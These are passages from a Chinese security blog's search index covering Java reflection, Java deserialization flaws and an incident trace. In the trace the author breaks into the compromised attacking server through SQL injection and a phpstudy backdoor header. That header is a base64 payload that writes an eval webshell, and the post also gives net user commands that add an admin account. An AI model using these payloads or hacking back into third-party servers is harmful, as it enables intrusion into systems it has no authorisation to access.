&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;name:&quot;</span>+name+<span class="string">&quot;;age:&quot;</span>+age+<span class="string">&quot;;phone:&quot;</span>+phone+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Method访问成员setinfo()方法并传参设置变量值</span></span><br><span class="line">        Method mt=people1.getDeclaredMethod(<span class="string">&quot;setinfo&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//Method调用方法传参</span></span><br><span class="line">        Object mtobj=mt.invoke(obj,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;13011111111&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//Method访问成员show()方法</span></span><br><span class="line">        Method mt2=people1.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Method实现截图：</p><p><img src="/posts/7a787d86/jc-6.png" title="Method实现"></p><h3 id="4、Constructor访问成员构造方法"><a href="#4、Constructor访问成员构造方法" class="headerlink" title="4、Constructor访问成员构造方法"></a>4、Constructor访问成员构造方法</h3><p>为了能够动态获取对象构造方法的信息，首先需要通过下列方法之一创建一个 Constructor 类型的对象或者数组。<br><strong>Constructor声明使用的方法</strong></p><table><thead><tr><th align="center">Constructor声明使用的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取所有权限为public的构造方法</td></tr><tr><td align="center">getDeclaredConstructors()</td><td align="center">获取当前对象的所有构造方法</td></tr><tr><td align="center">getDeclaredConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取当前对象所有带参数类型的构造方法</td></tr></tbody></table><p><strong>Constructor常用的方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">public String getName()</td><td align="left">返回构造方法名</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该构造方法是否允许带可变数量的参数，如果允许，返回 true，否则返回false</td></tr><tr><td align="center">getParameterTypes()</td><td align="left">按照声明顺序以 Class 数组的形式获取该构造方法各个参数的类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获取该构造方法可能抛出的异常类型</td></tr><tr><td align="center">newInstance(Object … initargs)</td><td align="left">通过该构造方法利用指定参数创建一个该类型的对象，如果未设置参数则表示采用默认无参的构造方法</td></tr><tr><td align="center">setAccessiable(boolean flag)</td><td align="left">如果该构造方法的权限为 private，默认为不允许通过反射利用 netlnstance()方法创建对象。如果先执行该方法，并将入口参数设置为 true，则允许创建对象</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该构造方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setinfo</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.phone=phone;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">people</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;调用了无参构造方法：&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">people</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        setinfo(name,phone,age);</span><br><span class="line">        System.out.print(<span class="string">&quot;调用了带参数的构造方法：&quot;</span>+show());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;name:&quot;</span>+name+<span class="string">&quot;;age:&quot;</span>+age+<span class="string">&quot;;phone:&quot;</span>+phone+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Method访问成员setinfo()方法并传参设置变量值</span></span><br><span class="line">        Method mt=people1.getDeclaredMethod(<span class="string">&quot;setinfo&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//Method调用方法传参</span></span><br><span class="line">        Object mtobj=mt.invoke(obj,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;13011111111&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//Method访问成员show()方法</span></span><br><span class="line">        Method mt2=people1.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------分割线--------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Constructor访问成员构造方法</span></span><br><span class="line">        <span class="comment">//方法一、通过newInstance()调用无参构造方法</span></span><br><span class="line">        Object obj2=people1.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法一：直接通过newInstance()调用无参构造方法&quot;</span>);</span><br><span class="line">        <span class="comment">//方法二、通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法</span></span><br><span class="line">        Constructor ct=people1.getDeclaredConstructor(String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        Object obj3=ct.newInstance(<span class="string">&quot;张四&quot;</span>,<span class="string">&quot;13022222222&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法二：通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法&quot;</span>);</span><br><span class="line">        <span class="comment">//方法三、通过getDeclaredConstructor()调用无参构造方法</span></span><br><span class="line">        Constructor ct2=people1.getDeclaredConstructor();</span><br><span class="line">        Object obj4=ct2.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法三：通过getDeclaredConstructor()调用无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Constructor实现截图：</p><p><img src="/posts/7a787d86/jc-7.png" title="Constructor实现"></p><h1 id="0x02、思考"><a href="#0x02、思考" class="headerlink" title="0x02、思考"></a>0x02、思考</h1><p>Java反射是真的累啊看下来，为了实现动态对类的操作，绕了很大一圈，多出来很多代码去实现这个功能，但确实使用反射很大程度降低了代码之间的依赖性，实现动态加载。<br>java反射核心想法就是：突破常规访问限制，就是为了动态访问类。<br>导致的安全问题也是因为突破常规访问限制，利用反射去访问对象以及篡改变量值包括一些私有属性的变量。</p><h1 id="0x03、参考链接"><a href="#0x03、参考链接" class="headerlink" title="0x03、参考链接"></a>0x03、参考链接</h1><p><a href="http://c.biancheng.net/view/6907.html">http://c.biancheng.net/view/6907.html</a><br><a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943/article/details/120587716</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次普通的攻击溯源排查</title>
      <link href="/posts/777da932.html"/>
      <url>/posts/777da932.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>一次恶意扫描触发的告警，溯源排查攻击源IP，简单记一下这次的溯源排查流程。</p><h2 id="0x01、告警"><a href="#0x01、告警" class="headerlink" title="0x01、告警"></a>0x01、告警</h2><p>可以看是<font color="red">同一时间</font>的告警，受害IP为该C段下的三台业务服务器，触发的三条告警，可直接判断为<font color="red">恶意扫描</font>。</p><p><img src="/posts/777da932/gj-1.png" title="告警"> </p><p>查看攻击流量http报文，可看到phpstudy的后门利用payload，排除误报。</p><p><img src="/posts/777da932/gj-2.png" title="告警报文"><br><img src="/posts/777da932/gj-3.png" title="告警payload"> </p><h2 id="0x02、溯源排查"><a href="#0x02、溯源排查" class="headerlink" title="0x02、溯源排查"></a>0x02、溯源排查</h2><p>针对攻击源IP，进行常规溯源流程（威胁情报、域名反查、IP端口开放情况、可利用的漏洞等）</p><h3 id="攻击源IP情况："><a href="#攻击源IP情况：" class="headerlink" title="攻击源IP情况："></a>攻击源IP情况：</h3><p>直接丢ti、微步、360威胁情报同理，取有用信息。</p><p><img src="/posts/777da932/pc-1.png" title="威胁情报"> </p><p>攻击源ip：绵阳阿里云<br>有用信息就只有反查域名，注册过m.xxx.cn，还有一些其他域名，查了没啥有用的。<br>查看m.xxx.cn域名信息，该域名为一家装饰公司备案的，也有备案号。</p><p><img src="/posts/777da932/pc-2.png" title="域名查询"> </p><p>同时ping该域名也是正常解析到攻击源IP上的，说明当前域名与攻击IP是绑定匹配的，时效期内。</p><p><img src="/posts/777da932/pc-3.png" title="域名IP绑定"> </p><p>同时威胁情报也能看到对应开放的端口，但大部分时效性不强，可以结合fofa查看或者自己扫描攻击源IP开放的端口。<br>扫描查看到攻击源IP开放了80、3389、8085等端口。<br>访问web页面，访问跳转&#x2F;index2.php页面，标题为屠龙之怒，与该公司名称xx装饰集团四川有限公司业务不符，疑为该公司网站被挂黑链，服务器被当作跳板对外发出恶意扫描。</p><p><img src="/posts/777da932/pc-4.png" title="web应用"> </p><p>攻击源IP简述:<br>1、绵阳阿里云服务器<br>2、注册域名为m.xxx.cn，为某装修公司，域名与IP绑定匹配。<br>3、web应用跳转游戏，疑似被挂黑页，疑为肉鸡。</p><h3 id="攻击源IP反制："><a href="#攻击源IP反制：" class="headerlink" title="攻击源IP反制："></a>攻击源IP反制：</h3><p>一来就看游戏入口去了，一个游戏页面，简单抓了包</p><p><img src="/posts/777da932/fz-1.jpg" title="登录"> </p><p>存在用户，但没啥关系，存在sql注入，查看了库，只有test库（&#x2F;不对劲，交互连接的库名不是这个），但不能查询内容。</p><p><img src="/posts/777da932/fz-2.png" title="sql注入"> </p><p>–os-shell一把嗦。</p><p><img src="/posts/777da932/fz-3.jpg" title="sql注入"> </p><p>权限不够，权限不足，–file-read啥的也是没权限直接过。<br>于此同时目录也早扫完了，查看了一下，看到早就已经被挂了马了，肉鸡没跑了。</p><p><img src="/posts/777da932/fz-4.png" title="目录扫描"> </p><p>查看了下漏扫结果，存在phpstudy后门，才反应过来本来就是肉鸡，一个劲对外扫phpstudy后门，黑页的游戏也是phpstudy部署的，本身就有后门</p><p><img src="/posts/777da932/fz-5.png" title="漏洞扫描"> </p><p>顺其自然通过Phpstudy后门写文件获取shell</p><p><img src="/posts/777da932/fz-6.png" title="payload"> </p><p>手工直接请求头添加下面payload即可，同时删除原本的Accept-Encoding改成下面的，&#x2F;&#x2F;开始忘删了导致没生效，蠢死。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInVwZGF0ZSJdKT9ePj5DOlxMVF9TZXJ2ZXJccGhwU3R1ZHlcV1dXXHVwZGF0ZTF0ZXN0LnBocCcpOw==</span><br></pre></td></tr></table></figure><p><img src="/posts/777da932/fz-7.png" title="发送payload"> </p><h3 id="攻击源IP服务器分析："><a href="#攻击源IP服务器分析：" class="headerlink" title="攻击源IP服务器分析："></a>攻击源IP服务器分析：</h3><p>其中查看数据发现系统存在可见内最早的webshell为2019-10-15日,文件名为test.php(不确定是否为文件真正上传建立的日期)</p><p><img src="/posts/777da932/sy-1.png" title="webshell"> </p><p>以及2022-10-10 01:28创建的webshell，文件名称为phpshell.php，同时期上传的cs马</p><p><img src="/posts/777da932/sy-2.png" title="webshell"> </p><p>但该攻击者未进行其他的相关操作，仅获取服务器权限后看了一下，未发现其他操作。<br>于此同时，发现被添加的影子账户loxxxxo$,并且在这个影子账户的桌面上传了phpstudy的批量扫描后门利用工具，以及一些扫描记录和扫描的目标网段</p><p><img src="/posts/777da932/sy-3.png" title="记录"><br><img src="/posts/777da932/sy-4.png" title="记录"> </p><p>通过创建影子账户登录服务器，本身就开了3389，就不用再开启端口了</p><p><img src="/posts/777da932/sy-5.png" title="创建账户"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user xxx /add  //添加管理员账户</span><br><span class="line">net localgroup administrators xxx /add  //将添加的管理员账户加入管理员组</span><br></pre></td></tr></table></figure><p>利用工具的一些扫描记录</p><p><img src="/posts/777da932/sy-6.png" title="利用工具"> </p><p>同时该影子用户还上传了一些黑灰产软件，运行挂起获取收益</p><p><img src="/posts/777da932/yz-1.png" title="挂起收益"> </p><p>一个月内获得的积分收益</p><p><img src="/posts/777da932/yz-2.png" title="挂起收益"> </p><h3 id="攻击源IP-loxxxxo影子用户分析："><a href="#攻击源IP-loxxxxo影子用户分析：" class="headerlink" title="攻击源IP loxxxxo影子用户分析："></a>攻击源IP loxxxxo影子用户分析：</h3><p>通过查看服务器端口连接情况发现与该服务器3389远程连接有一个IP 175.xxx.xxx.138（上海 腾讯云），极大可能也为肉鸡。</p><p><img src="/posts/777da932/yz-3.png" title="连接情况"> </p><p>同时查看当前服务器在线用户，该影子用户loxxxxo$处于连接在线状态，也就是说上述的175.xxx.xxx.138的腾讯云服务器即为该影子用户的远程连接主机。</p><p><img src="/posts/777da932/yz-4.png" title="在线情况"> </p><p>通过信息查看loxxxxo$用户创建时间为2022年9月20日（不排除为后续修改密码后的时间）（因此说明10号上传的webshell的攻击者与该用户不为同一人）。</p><p><img src="/posts/777da932/yz-5.png" title="创建情况"> </p><p><strong>简述该用户信息：</strong><br>1、影子用户：loxxxxo$<br>2、远程连接主机：175.xxx.xxx.138（上海 腾讯云）<br>3、9月20日甚至跟早入侵该攻击源IP并作为跳板对外扫描Phpstudy后门，同时利用入侵主机部署黑灰产软件获益。<br>4、其中一个黑灰产软件使用的他的会员号：AG-xxx</p><h3 id="后续思路："><a href="#后续思路：" class="headerlink" title="后续思路："></a>后续思路：</h3><p>1、针对175.xxx.xxx.138攻击主机，简单看了一下，开了80端口 但没什么应用部署，也没查到相关威胁情报信息，极大可能也为跳板机。<br>2、针对黑灰产软件上的会员号信息，涉及到网站jingxxx.taxxx.com，意思得获取这个网站权限在查相关用户信息，工作量较大，仅思考了下。</p><h3 id="总结事件线："><a href="#总结事件线：" class="headerlink" title="总结事件线："></a>总结事件线：</h3><p>该源IP被很早入侵并使用phpstudy部署了几套web游戏系统——&gt;真实攻击者持有IP175.xx.xx.138通过phpstudy后门扫到该服务器存在后门，并通过后门获取服务器权限，同时创建了影子账户loxxxxo$——&gt;该用户上传黑灰产软件运行挂机收益，同时定期使用Phpstudy批量扫描工具对全网扫描——&gt;10月10日凌晨扫描至单位业务系统服务器触发告警。</p><h2 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h2><p>本次溯源并未实际溯源到真实用户，排查过程也很仓储，也没去找最开始的入侵痕迹，简单排查告警触发后的溯源分析过程，了解攻击者的入侵思路和入侵意图，再进一步的话可能从后续思路再入手，但可能短时间获取不到有用信息，就先这样记录下吧。</p>]]></content>
      
      
      <categories>
          
          <category> 实战记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识反序列化</title>
      <link href="/posts/45180cd1.html"/>
      <url>/posts/45180cd1.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>学习java基础知识记录，方便查阅。</p><h2 id="0x01、反序列化是什么？有什么用？"><a href="#0x01、反序列化是什么？有什么用？" class="headerlink" title="0x01、反序列化是什么？有什么用？"></a>0x01、反序列化是什么？有什么用？</h2><blockquote><p>  Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 </p></blockquote><p>java序列化会更有利于传输，它的速度会更快，并且也会更安全，被调用方序列化，调用方反序列化即能够得到传输之前的最原始的java对象，常常用来做不同进程之间的对象传输。能够更加便于储存，不论是存储成文件又或者是存储成数据库都是可以的，存储成文件，下次要用可以直接反序列拿到对象。</p><h2 id="0x02、反序列化如何实现"><a href="#0x02、反序列化如何实现" class="headerlink" title="0x02、反序列化如何实现"></a>0x02、反序列化如何实现</h2><p>实现方法：通过该对象所处类实现<font color="red">Serializable</font>接口，调用<font color="red">writeObject()</font>方法序列化、<font color="red">readObject()</font>方法反序列化分别对对象进行数据转换的写入和读取。</p><p><font color="red">writeObject()</font>序列化：将java对象转换成java字节序列、json、xml等数据格式的过程，利用ObjectOutputStream流接口把对象序列化数据写入文件。<br><font color="red">readObject()</font>反序列化：将java字节序列、json、xml等数据格式还原成java对象的过程，利用ObjectInputStream流接口把序列化文件读取并恢复成对象。</p><p>一个类的对象要想序列化成功，必须满足两个条件：<br>1、该类必须实现 java.io.Serializable 接口。<br>2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。<br>注：不可序列化的属性：带static修饰（静态变量）和transient修饰（临时变量）的属性，对于transient属性序列化机制会跳过而不会将其写入文件，但在读取时也不可恢复，该属性值保持默认初始化值。</p><h2 id="0x03、反序列化代码实现demo"><a href="#0x03、反序列化代码实现demo" class="headerlink" title="0x03、反序列化代码实现demo"></a>0x03、反序列化代码实现demo</h2><p>新建java项目，创建pack包，新建java程序，不赘述了。</p><h3 id="类对象："><a href="#类对象：" class="headerlink" title="类对象："></a>类对象：</h3><p>创建people类，并实现<font color="red">Serializable</font>接口</p><p><img src="/posts/45180cd1/classpeople.png" title="people类"></p><h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><p>创建demo类，实现对people类对象调用并实例化输出</p><p><img src="/posts/45180cd1/ser.png" title="序列化过程"></p><p>查看输出txt为序列化数据</p><p><img src="/posts/45180cd1/sertxt.png" title="序列化结果"></p><p>生成的数据文件为16进制，乱码显示以  sr开头</p><blockquote><p>  java原生序列化的16进制是以aced00057372开头、base64编码是以rO0ABXNy开头</p></blockquote><h3 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h3><p>创建unser类，实现对序列化文件进行反序列化读取并输出。</p><p><img src="/posts/45180cd1/unser.png" title="序列化结果"></p><p>以上过程为一个简单的序列化与反序列化的过程。</p><h2 id="0x04、安全成因"><a href="#0x04、安全成因" class="headerlink" title="0x04、安全成因"></a>0x04、安全成因</h2><p>与其说是漏洞成因，不妨说是安全成因，单从上述的反序列化过程似乎没发现怎么变成常谈的java反序列化漏洞，既然是反序列化漏洞，那重点就在反序列化上，即readObject()方法;<br>学习总结的漏洞成因要素：<br>1、readObject()方法被重写，当实现Servializable类并重写了readObject()方法，系统执行反序列化时会调用重写的readObject()方法。<br>2、重写的readObject()方法含有危险方法，如方法中直接执行Runtime.getRuntime().exec();<br>3、重写的readObject()方法中存在调用其它类的可控变量并执行危险函数。<br>4、套娃3步骤，调用其它类中变量再次调用另外一个类中的方法。#可以理解为常说的gadget链，通俗点说就是漏洞利用链。</p><h3 id="案例demo-1"><a href="#案例demo-1" class="headerlink" title="案例demo-1"></a>案例demo-1</h3><p><strong>重写readObject方法并直接执行危险函数</strong><br>实现Servializable类的实例类重写了readObject()方法，readObject()方法执行了危险函数。</p><p><img src="/posts/45180cd1/anli-1.png" title="readObject方法重写"></p><p>这是执行反序列化步骤 发现危险函数被执行</p><p><img src="/posts/45180cd1/anli-2.png" title="危险函数被执行"></p><p>通过调试可以认证这点<br>在调用readObject()方法处下断点</p><p><img src="/posts/45180cd1/anli-3.png" title="调试"></p><p>可看到调用重写的readObject()方法</p><p><img src="/posts/45180cd1/anli-3-1.png" title="调试"></p><h3 id="案例demo-2"><a href="#案例demo-2" class="headerlink" title="案例demo-2"></a>案例demo-2</h3><p><strong>重写readObject方法，方法中调用了其他类中的危险方法</strong><br>新建立一个exec类，其中exec类使用了危险函数。</p><p><img src="/posts/45180cd1/anli-4-1.png" title="exec类"></p><p>重写readObject方法，方法中调用了exec类对象。</p><p><img src="/posts/45180cd1/anli-4-2.png" title="readObject方法重写"></p><p>同样运行反序列化操作，同样实现了反序列化漏洞，执行了命令</p><p><img src="/posts/45180cd1/anli-4-3.png" title="readObject方法重写"></p><p>上诉案例仅提供漏洞造成原理思路，实际漏洞调用链远比其复杂例如cc链。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
